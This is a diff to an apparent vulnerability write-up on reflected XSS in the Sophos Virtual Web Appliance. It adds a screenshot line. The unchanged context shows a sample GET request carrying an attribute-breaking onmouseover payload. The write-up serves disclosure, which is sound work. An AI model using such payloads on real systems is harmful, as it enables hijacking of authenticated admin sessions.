@@ -42,6 +42,8 @@ Sample GET request:
 https://10.0.0.17/index.php?c=trend_suspect&period=0&section=reports" onmouseover%3dprompt(1) bad%3d"&STYLE=34f6ad4ed0b9f19a094041a234feb5e3
 {% endhighlight %}
 
+![Java Script executed when the page loads in the user's browser](/static/img/swa-4.1.1.png)
+
 Authenticated reflected XSS with the privileges of admin user.
 Sophos Virtual Web Appliance used to demonstrate the vulnerability was the latest available from Sophos trials website. 
 
